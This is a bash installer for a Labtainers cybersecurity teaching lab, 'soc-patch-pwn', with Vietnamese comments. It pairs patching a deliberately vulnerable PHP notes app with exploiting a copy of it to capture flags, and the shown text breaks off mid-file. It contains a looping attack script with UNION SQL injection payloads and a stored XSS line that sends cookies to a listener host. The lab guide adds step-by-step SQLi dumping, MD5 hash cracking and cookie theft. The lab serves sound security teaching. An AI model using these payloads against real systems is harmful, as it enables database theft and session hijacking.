#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-patch-pwn (KB5 Hybrid: Patch & Pwn) tren VM Labtainers.
# Chay tren VM:  bash install-soc-patch-pwn.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-patch-pwn
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-patch-pwn
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong ngam.
setsid python3 /home/ubuntu/attack.py >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.py" <<'__EOF_PP_5x9q__'
#!/usr/bin/env python3
# Tan cong tu dong vao 'targeta' (he A - NoteBox): UNION SQLi o /search.php + cam mot note
# chua Stored XSS. Chay lien tuc (tu 172.20.0.5) de SIEM/log ghi nhan cho Blue dieu tra.
import urllib.request, urllib.parse, http.cookiejar, time

B = "http://targeta"

def session():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(op, path):
    try:
        with op.open(B + path, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except Exception as e:
        return None, str(e)

def post(op, path, data):
    d = urllib.parse.urlencode(data).encode()
    try:
        with op.open(B + path, d, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except Exception as e:
        return None, str(e)

# Cho NoteBox san sang
op = session()
for _ in range(120):
    c, _b = get(op, "/")
    if c:
        break
    time.sleep(2)

# Cac buoc trinh sat SQLi kinh dien (de SV thay trong log)
recon = [
    "'",
    "%' ORDER BY 3 -- ",
    "%' UNION SELECT 1,2 -- ",
    "%' UNION SELECT version(),database() -- ",
    "%' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- ",
    "%' UNION SELECT username,password FROM users -- ",
]
xss_note = "<script>new Image().src='http://172.20.0.5:9001/?c='+document.cookie</script>"
i = 0
while True:
    i += 1
    op = session()
    post(op, "/register.php", {"username": "mallory%d" % i, "password": "x"})     # auto-login
    post(op, "/dashboard.php", {"title": "hello", "body": xss_note})              # cam Stored XSS
    for p in recon:
        get(op, "/search.php?q=" + urllib.parse.quote(p))                         # trinh sat SQLi
    print(time.strftime("%H:%M:%S"), "attack round", flush=True)
    time.sleep(15)
__EOF_PP_5x9q__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_PP_5x9q__'
SOC Lab KB5 - Patch & Pwn (Hybrid Blue + Red) - web app "NoteBox" (MariaDB, co giao dien).
Blue: he A dang bi tan cong UNION SQL injection (+ lo loi SQL) va Stored XSS -> dieu tra qua
SIEM va VA ca hai, giu app chay dung.
Red: he B la ban sao chua va. Chuoi: SQLi -> dump bang users -> crack mat khau admin (bam MD5
yeu) -> dang nhap admin -> doc FLAG he thong; dong thoi cam Stored XSS -> xem admin panel ->
cuop cookie admin (XSS flag). Nop ca 2 flag qua /submit.php tren he B.
__EOF_PP_5x9q__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_PP_5x9q__'
# parameter.config - ca nhan hoa (chong chep bai)
# He B co 2 bi mat ca nhan hoa: FLAG chinh (lay qua chuoi SQLi->crack->admin) va XSSFLAG
# (lay qua Stored XSS doc cookie admin). Grading xac minh TREN he B (B khong co shell).
FLAGVAL : RAND_REPLACE : targetb:.local/bin/fixlocal.sh : FLAGVAL : 100000 : 999999
XSSVAL  : RAND_REPLACE : targetb:.local/bin/fixlocal.sh : XSSVAL  : 100000 : 999999
__EOF_PP_5x9q__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_PP_5x9q__'
# start.config - Lab soc-patch-pwn (KB5 Hybrid: Patch & Pwn - dich vu web NoteBox)
# attacker (C) khai thac SQLi + Stored XSS vao targeta (A) -> SV VA (Blue).
# SV dung chinh ky thuat do PWN targetb (B) qua HTTP: doc flag roi NOP qua /submit.php (Red).

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-patch-pwn_student_master_seed
	GRADE_CONTAINER targeta

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- A: NoteBox cua sinh vien (2 lo hong + Wazuh agent). SV phai VA ---
CONTAINER targeta
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	ADD-HOST targetb:172.20.0.40
	TERMINALS 1

# --- B: NoteBox production (lo hong y het, chua va), CHI HTTP (khong SSH). SV PWN lay flag ---
CONTAINER targetb
	USER ubuntu
	SOC_NET 172.20.0.40
	TERMINALS 0

# --- C: ke tan cong, chay ngam, khai thac SQLi + Stored XSS vao A ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST targeta:172.20.0.10
	TERMINALS 0

# --- SIEM: Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram sinh vien - Firefox xem dashboard + curl de khai thac B ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST targetb:172.20.0.40
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_PP_5x9q__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Defender: tao san wordlist de crack MD5 cua admin (he B) - gom nhieu mat khau pho bien + mat khau that.
# SV crack vd: while read p; do echo "$(printf %s "$p"|md5sum|cut -d' ' -f1) $p"; done < wordlist.txt | grep <hash>
cat > /home/ubuntu/wordlist.txt <<'WL'
123456
password
admin
admin123
root
toor
qwerty
letmein
welcome
monkey
dragon
iloveyou
sunshine
password1
123456789
football
abc123
111111
princess
flower
hottie
loveme
zaq1zaq1
password123
qwerty123
secret
baseball
superman
trustno1
whatever
letmein99
hunter2
changeme
P@ssw0rd
summer2024
spring2024
WL
chmod 644 /home/ubuntu/wordlist.txt 2>/dev/null || true
exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.attacker.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - attacker (khai thac SQLi + Stored XSS tu dong, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.defender.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Firefox co san trong base firefox3; them ssh client + curl + python3 (C2 listener cho XSS)
# apt-get update || true: tranh fail cung khi kho ben thu 3 (mozilla) sync do - cac goi lay tu kho Ubuntu chinh
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client curl python3 \
    && rm -rf /var/lib/apt/lists/*
# john de crack MD5 (best-effort: neu kho thieu 'universe' thi bo qua, SV dung md5sum thay the)
RUN apt-get update || true; apt-get install -y --no-install-recommends john && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.siem.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.targeta.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - targeta (he A: NoteBox PHP + MariaDB + Wazuh agent, SV va)
#
ARG registry
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Web stack NoteBox: apache + php + MariaDB
RUN DEBIAN_FRONTEND=noninteractive apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php php-mysql mariadb-server curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 php7.0-mysql mariadb-server curl \
    ) ; rm -rf /var/lib/apt/lists/*
#
# Wazuh agent (bake, tro ve manager 172.20.0.20)
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent
RUN systemctl enable apache2 2>/dev/null || true
RUN systemctl enable mariadb 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-patch-pwn.targetb.student" <<'__EOF_PP_5x9q__'
#
# Labtainer Dockerfile - targetb (he B: NoteBox PHP + MariaDB, chi HTTP, SV pwn lay flag)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Web stack NoteBox + MariaDB (khong Wazuh, khong SSH)
RUN DEBIAN_FRONTEND=noninteractive apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php php-mysql mariadb-server curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 php7.0-mysql mariadb-server curl \
    ) ; rm -rf /var/lib/apt/lists/*
RUN systemctl enable apache2 2>/dev/null || true
RUN systemctl enable mariadb 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PP_5x9q__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_PP_5x9q__'
================================================================================
 SOC LAB (KB5): PATCH & PWN - HYBRID BLUE + RED   (web app "NoteBox", MariaDB)
================================================================================

1. TONG QUAN (OVERVIEW)
--------------------------------------------------------------------------------
"NoteBox" la web app ghi chu ca nhan (dang ky/dang nhap/tao-xem-tim note). He A (targeta,
172.20.0.10) - NoteBox cua ban - dang bi tan cong lien tuc tu 172.20.0.5 bang: UNION SQL
injection (o tim kiem) va Stored XSS (admin xem note bi chay JS). He B (targetb, 172.20.0.40)
la ban sao "production" CHUA VA, chi vao qua HTTP, chua 2 bi mat: FLAG he thong va XSS flag.

Ban dong ca hai vai (nhu mot tran Attack & Defense CTF):
  * BLUE: dieu tra qua SIEM, VA ca 2 lo hong tren A - ma dich vu VAN CHAY DUNG.
  * RED : khai thac he B de lay CA 2 flag roi NOP qua /submit.php.

2. MUC TIEU HOC TAP (OBJECTIVES)
--------------------------------------------------------------------------------
  - Thuc hanh quy trinh UNION SQL injection day du (do loi -> dem cot -> union -> trich xuat).
  - Hieu hau qua "bam mat khau yeu" (MD5 khong salt) + mat khau yeu -> bi crack.
  - Hieu Stored XSS + danh cap cookie qua C2.
  - Va dung cach (prepared statement, escape output) ma khong lam hong chuc nang (SLA).

3. KIEN THUC NEN (BACKGROUND)
--------------------------------------------------------------------------------
* UNION SQLi: khi truy van ghep chuoi, ke tan cong them "UNION SELECT ..." de noi du lieu bang
  khac vao ket qua. Can biet SO COT va cot nao HIEN THI. (MySQL: co version(), database(),
  user(), va information_schema de liet ke bang/cot.)
* Bam mat khau: dung md5crypt ($1$... - thuat toan yeu) + mat khau yeu => dump hash roi crack
  bang wordlist la ra.
* Stored XSS: noi dung do nguoi dung nhap duoc hien thi KHONG escape -> <script> chay trong
  trinh duyet nguoi XEM. Neu admin xem -> chay trong phien admin -> co the danh cap cookie.
* NoteBox: /register.php, /login.php (prepared - khong SQLi), /dashboard.php (note cua ban +
  tao note + o tim kiem), /note.php?id= (DIEM YEU: Stored XSS), /search.php?q= (DIEM YEU: SQLi),
  /admin.php (chi admin; DIEM YEU: Stored XSS). App in body note KHONG escape o CA note.php lan
  admin.php -> phai va ca hai noi.

4. MOI TRUONG & SO DO (TOPOLOGY)
--------------------------------------------------------------------------------
  attacker (172.20.0.5, AN)  -- khai thac SQLi + cam XSS vao A
  targeta  (172.20.0.10)     -- HE A: NoteBox + Wazuh agent; ban VA tai day (SSH analyst)
  targetb  (172.20.0.40)     -- HE B: NoteBox co 2 flag, CHI HTTP; ban PWN
  siem     (172.20.0.20)     -- Wazuh dashboard (https://172.20.0.20)
  defender (172.20.0.30)     -- tram cua ban: Firefox + curl + python3 + wordlist.txt (crack)
  *** Lan dau cho siem cai Wazuh (~8-10'):  tail -f /var/log/wazuh-install.log ***

5. NHIEM VU (TASKS)
--------------------------------------------------------------------------------
--- PHAN BLUE (tren he A) ---

Task 1 - Dieu tra qua dashboard Wazuh (https://172.20.0.20):
  Loc su kien web agent targeta theo IP nguon. Ke tan cong (172.20.0.5) goi gi? Nhan ra:
    (a) /search.php?q=... co cu phap SQL (ORDER BY, UNION SELECT, information_schema) -> SQLi
    (b) note chua <script> (hien o admin panel) -> Stored XSS
  Ghi ATTACKER_IP, VULN1, VULN2 vao bao cao /home/analyst/findings.txt.

Task 2 - VA he A (SSH analyst@targeta, mat khau: analyst; ma nguon /var/www/html):
    - search.php : dung PREPARED STATEMENT cho tu khoa (va nen AN loi SQL - khong echo $db->error).
    - note.php VA admin.php : ESCAPE body note khi in (htmlspecialchars) - app chua escape o CA HAI,
      phai va ca hai moi het Stored XSS.
  *** Khong va qua tay: dang nhap/tao/xem/tim note cua minh PHAI con chay (checker se kiem). ***

--- PHAN RED (tren he B, tu defender) ---

Task 3 - UNION SQL injection tung buoc (o o tim kiem /search.php - dung trinh duyet/Burp/curl):
   B1. Do loi: nhap  '   "   )   -> trang bao "Loi SQL..." => dinh SQLi.
   B2. Dem cot: ...%' ORDER BY 1 --  tang dan den khi loi => so cot (o day 2).
   B3. Tim cot hien thi: ...%' UNION SELECT 1,2 --  => thay so nao hien ra.
   B4. Trinh sat: ...%' UNION SELECT version(),database() --
   B5. Liet ke bang: ...%' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() --
   B6. Liet ke cot: ...%' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --
   B7. Dump users: ...%' UNION SELECT username,password FROM users --   => lay admin + hash md5crypt ($1$...).

Task 4 - Crack hash + dang nhap admin + lay FLAG:
   - Hash admin co dang md5crypt (admin:$1$....). Luu dong 'username:hash' vao file roi crack
     bang John the Ripper + wordlist co san (john tu nhan dien md5crypt, khong can --format):
       echo 'admin:$1$....' > hash.txt
       john --wordlist=/home/ubuntu/wordlist.txt hash.txt
       john --show hash.txt                            # -> admin:<mat khau>
   - Dang nhap admin bang mat khau crack duoc -> mo /admin.php -> doc "Bi mat he thong" = FLAG.
   - Nop:  http://172.20.0.40/submit.php?flag=FLAG-xxxxxx

Task 5 - Stored XSS cuop cookie admin (XSS flag):
   - Tren defender mo C2 nhan cookie, vd:   python3 -m http.server 8000
   - Dang ky 1 tai khoan thuong, tao note co payload:
       <script>new Image().src='http://172.20.0.30:8000/?c='+document.cookie</script>
   - Dang nhap admin (o Task 4) roi mo /admin.php -> payload chay trong phien admin -> gui
     cookie ve C2. Trong cookie co 'ssession=XSSFLAG-xxxxxx'.
   - Nop:  http://172.20.0.40/submit.php?xss=XSSFLAG-xxxxxx
   (Neu VM co internet, co the dung webhook.site thay cho C2 noi bo.)

6. NOP BAI (SUBMISSION)
--------------------------------------------------------------------------------
  Hoan tat findings.txt (ATTACKER_IP, VULN1, VULN2). checkwork -> tu kiem tra ; stoplab -> nop.
  Cac muc cham (chi cham VIEC BAN LAM):
    - blue_patched : A het SQLi + het XSS VA dich vu con chay dung (SLA).
    - reported     : bao cao dung IP + 2 lo hong.
    - red_flag     : da nop dung FLAG he thong cua B.
    - red_xss      : da nop dung XSS flag cua B.
    - mission_complete : va xong 2 lo hong (A song) + lay ca 2 flag cua B.
__EOF_PP_5x9q__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_PP_5x9q__'
# goals.config - Hybrid Patch & Pwn (NoteBox MariaDB: UNION SQLi + weak MD5 + Stored XSS)
# Chi cham VIEC SINH VIEN LAM (bo siem_detected/agent_connected vi chung tu Y khi lab chay).

# BLUE: he A het CA 2 lo hong (SQLi + XSS) NHUNG dich vu van chay dung (SLA)
blue_patched = boolean : ( _a_marker and _sla and_not _sqli and_not _xss )
# BLUE: bao cao dung IOC (IP + 2 lo hong)
reported     = boolean : ( _a_marker and _rep_ip and _rep_v1 and _rep_v2 )
# RED: lay FLAG chinh cua he B (chuoi SQLi -> crack -> admin -> System secret)
red_flag     = boolean : _flag
# RED: lay XSS flag cua he B (Stored XSS cuop cookie admin)
red_xss      = boolean : _xssflag

# MUC TIEU TONG: va xong 2 lo hong (A con song) + lay duoc CA 2 flag cua B
mission_complete = boolean : ( _a_marker and _sla and_not _sqli and_not _xss and _flag and _xssflag )
__EOF_PP_5x9q__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_PP_5x9q__'
# results.config - Hybrid NoteBox (UNION SQLi + weak MD5/crack + Stored XSS), MariaDB
# Chi cham VIEC SINH VIEN LAM; prestop chi in co/OK; loot ca nhan hoa xac minh TREN he B.

# --- BLUE (he A) ---
_a_marker = targeta:prestop.stdout : FILE_REGEX : PRESTOP_MARKER_A
# SLA: checker dang nhap + doc note cua minh (app con chay dung)
_sla      = targeta:prestop.stdout : FILE_REGEX : SLA_OK
# Con lo hong SQLi (UNION ra marker)?
_sqli     = targeta:prestop.stdout : FILE_REGEX : SQLI_OPEN
# Con lo hong Stored XSS (admin panel in body RAW)?
_xss      = targeta:prestop.stdout : FILE_REGEX : XSS_OPEN
# Bao cao: IP + 2 lo hong
_rep_ip = targeta:prestop.stdout : FILE_REGEX : REP_IP_OK
_rep_v1 = targeta:prestop.stdout : FILE_REGEX : REP_V1_OK
_rep_v2 = targeta:prestop.stdout : FILE_REGEX : REP_V2_OK

# --- RED (he B) ---
_flag    = targetb:prestop.stdout : FILE_REGEX : FLAG_OK
_xssflag = targetb:prestop.stdout : FILE_REGEX : XSS_OK

# --- Goi y checkwork ---
#CHECK_TRUE: Dich vu A phai con chay dung (checker dang nhap + doc note cua minh). Dung va qua tay.
cw_sla = targeta:prestop.stdout : FILE_REGEX : SLA_OK
#CHECK_FALSE: Van con UNION SQL injection tren /search.php. Hay dung prepared statement + an loi SQL.
cw_sqli = targeta:prestop.stdout : FILE_REGEX : SQLI_OPEN
#CHECK_FALSE: Van con Stored XSS: /admin.php in noi dung note khong escape. Hay escape output (htmlspecialchars).
cw_xss = targeta:prestop.stdout : FILE_REGEX : XSS_OPEN
#CHECK_TRUE: Chua bao cao dung IP ke tan cong + 2 lo hong (SQLi, XSS). Ghi vao findings.txt.
cw_report = targeta:prestop.stdout : FILE_REGEX : REP_IP_OK
#CHECK_TRUE: Chua lay duoc FLAG chinh cua he B (SQLi -> crack MD5 -> dang nhap admin -> doc System secret -> nop /submit.php?flag=).
cw_flag = targetb:prestop.stdout : FILE_REGEX : FLAG_OK
#CHECK_TRUE: Chua lay duoc XSS flag cua he B (cam XSS -> dang nhap admin xem admin panel -> cuop cookie -> nop /submit.php?xss=).
cw_xss2 = targetb:prestop.stdout : FILE_REGEX : XSS_OK
__EOF_PP_5x9q__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_PP_5x9q__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_PP_5x9q__'
#!/bin/bash
# prestop siem: chup bang chung Wazuh phat hien tan cong web (UNION SQLi + Stored XSS) vao he A.
# (Khong con dung de cham diem - chi la bang chung forensic cho GVHD doc.)
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (NoteBox: search.php UNION/information_schema, note <script>, tu 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE "search.php|union|select|information_schema|order by|script|register.php|172.20.0.5|web" | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_PP_5x9q__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_PP_5x9q__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/fixlocal.sh" <<'__EOF_PP_5x9q__'
#!/bin/bash
# targeta (he A - NoteBox, MariaDB), quyen 'ubuntu'. $1 = mat khau sudo.
# App THAT: dang ky/dang nhap (MD5) + tao/xem/tim note. Lo hong:
#   - UNION SQLi o /search.php (+ verbose SQL error)   -> dump users, crack MD5 -> admin
#   - Stored XSS o /admin.php (in body note khong escape) -> cuop cookie admin
# He A KHONG chua flag that (sentinel cho checker). Flag/XSSflag that o he B.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }
mkdir -p /tmp/nb

cat > /tmp/nb/config.php <<'PHP'
<?php
session_start();
mysqli_report(MYSQLI_REPORT_OFF);
